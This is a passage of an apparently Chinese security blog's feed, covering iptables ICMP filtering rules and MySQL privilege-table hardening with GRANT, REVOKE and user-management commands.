20:21 -j ACCEPT 禁止FTP</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p icmp --icmp-type 8 -j DROP</span><br><span class="line">iptables -A INPUT -p icmp --icmp-type 0 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p icmp --icmp-type 3 -j ACCEPT</span><br></pre></td></tr></table></figure><p>这就是我前面讲的对应自己ping别人可收到响应报文，别人却ping不到你，有效降低你被别人攻击的可能</p><p>再来看看一个例子<br>输入命令<code>iptables -t filter -I INPUT -p icmp -j REJECTED</code><br>这条命令是对进入的数据包进行icmp所有协议包进行过滤，需要注意两点第一，控制类型不一样返回的效果也不一样，第二对于icmp这种类型的报文而言，响应包跟请求包都被截了，后面会讲到如何可以接受icmp响应包而不接受请求包<br>然后尝试ping一下对面的机子，这是拒绝(REJECT)的效果<br><img src="https://s1.ax1x.com/2018/07/29/PaIsa9.png" alt="PaIsa9.png"></p><p>这是直接丢弃(DROP)的效果<br><img src="https://s1.ax1x.com/2018/07/29/PaIy5R.png" alt="PaIy5R.png"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>本来还想写写Windows下的防火墙，但由于是图形化界面，学起来也容易上手，就没写了，我比较懒~~~运用好防火墙，可以隐藏你自己的IP地址，减少被攻击的可能性，在生活中大有用处。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Linux下&lt;code&gt;iptables&lt;/code&gt;的设置，设置了它就能够有效地过滤掉相关的数据包从而阻挡相关攻击，感觉这个东西跟安全有很大用处，比如在我们学习的计算机网络知识里面，网络拓扑十分瓜皮，路由器没有过滤数据包的功能，直接就实现路由转发的过程，这样就会对一个LAN造成很大的安全隐患，
    
    </summary>
    
      <category term="环境部署" scheme="0verwatch.top/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
    
      <category term="Linux安全" scheme="0verwatch.top/tags/Linux%E5%AE%89%E5%85%A8/"/>
    
      <category term="服务器运维" scheme="0verwatch.top/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>Mysql安全配置</title>
    <link href="0verwatch.top/2018/07/26/Mysql-security-1/"/>
    <id>0verwatch.top/2018/07/26/Mysql-security-1/</id>
    <published>2018-07-26T12:35:31.000Z</published>
    <updated>2018-07-26T12:37:15.855Z</updated>
    
    <content type="html"><![CDATA[<p>mysql中存在4个控制权限的表，分别为<a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. mysql.USER表</span><br><span class="line">2. mysql.DB表</span><br><span class="line">3. mysql.TABLES_PRIV表</span><br><span class="line">4. mysql.COLUMNS_PRIV表</span><br></pre></td></tr></table></figure><p>要注意的是，Mysql中有一个数据库”<code>information_schema</code>“，似乎里面保存的也是一些权限信息，但是要明白的是，这个数据库”<code>information_schema</code>“是为系统管理员提供元数据的一个简便方式，它实际上是一个视图，可以理解为对Mysql中的一个信息的封装，对于Mysql主程序来说，身份认证和授权的信息的来源只有一个，就是”<code>mysql</code>“。</p><p>在我们进行数据库连接、登录的时候，mysql权限表的验证过程为：</p><ol><li>先从user表中的:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1) Host</span><br><span class="line">2) User</span><br><span class="line">3) Password</span><br></pre></td></tr></table></figure><p>这3个字段中判断连接的ip、用户名、密码是否存在，存在则通过验证。</p><ol start="2"><li>通过身份认证后，进行权限分配，按照下面的顺序进行验证。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1) user</span><br><span class="line">2) db</span><br><span class="line">3) tables_priv</span><br><span class="line">4) columns_priv</span><br></pre></td></tr></table></figure><p>即先检查全局权限表user，如果user中对应的权限为Y，则此用户对所有数据库的权限都为Y，将<code>不再</code>检查<code>db，tables_priv,columns_priv</code><br>如果全局权限表<code>user</code>对应的权限为<code>N</code>，则到db表中检查此用户对应的具体数据库，并得到db中为Y的权限<br>如果db中为N，则检查<code>tables_priv</code>中此数据库对应的具体表，取得表中的权限Y，以此类推。逐级下降</p><p>用自己的话讲就是因为查找他们权限是否配置好根据情况查看<code>mysql</code>这个数据库中的<code>user，db，tables_priv，columns_pri</code>，一旦在某个级别设置好了权限就不需要网下一级去看他是否存在权限了，因为下面一级的表都不会显示，这是为了防止数据库数据冗余。就是例如你设置的是所有数据库及表的权限的话，到时候就直接<code>select * from user;</code>就可以查看对应的程序啦<br><a href="https://imgchr.com/i/PNNSfK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/26/PNNSfK.md.png" alt="PNNSfK.md.png"></a></p><p>对于Mysql中的账户权限相关的安全配置，总结如下：</p><ol><li>针对每个网站建立一个单独的账户</li><li>为每个网站单独建立一个专属数据库(虽然DEDE、DZ普通采用表前缀的方法来实现”一库多站”，但好的做法还是”一库一站”)</li><li>按照<code>user-&gt;db-&gt;tables_priv-&gt;columns_pri</code>的顺序进行细粒度的权限控制</li><li>为每个用户单独配置一个专属数据库，保证当前用户的所有操作只能发生在它自己的数据库中，防止SQL注入发生后，黑客通过注入点访问到系统表</li></ol><p>账户权限安全配置需要的常用命令<br>1)新建一个用户并给予相应数据库的权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant select,insert,update,delete,create,drop privileges on 数据库名字.表名 to user@localhost identified by 'passwd';    //如果是*号就是代表全部*.*代表所有数据库下的全部表名</span><br><span class="line"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> database.* <span class="keyword">to</span> <span class="keyword">user</span>@localhost <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'passwd'</span>;</span><br></pre></td></tr></table></figure><p>2) 刷新权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br></pre></td></tr></table></figure><p>3)显示授权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">grants</span>;  //这句话只显示当前登录用户的权限</span><br></pre></td></tr></table></figure><p>4) 移除授权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">revoke</span> <span class="keyword">delete</span> <span class="keyword">on</span> *.* <span class="keyword">from</span> <span class="string">'user'</span>@<span class="string">'localhost'</span>;</span><br></pre></td></tr></table></figure><p>5) 删除用户<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> <span class="string">'user'</span>@<span class="string">'localhost'</span>;</span><br></pre></td></tr></table></figure></p><p>6) 给用户改名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">rename</span> <span class="keyword">user</span> <span class="string">'jack'</span>@<span class="string">'%'</span> <span class="keyword">to</span> <span class="string">'jim'</span>@<span class="string">'%'</span>;``</span><br></pre></td></tr></table></figure></p><p>7) 给用户改密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">PASSWORD</span> <span class="keyword">FOR</span> <span class="string">'root'</span>@<span class="string">'localhost'</span> = <span class="keyword">PASSWORD</span>(<span class="string">'123456'</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;mysql中存在4个控制权限的表，分别为
    
    </summary>
    
      <category term="Mysql安全配置" scheme="0verwatch.top/categories/Mysql%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="Mysql安全配置" scheme="0verwatch.top/tags/Mysql%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
</feed>
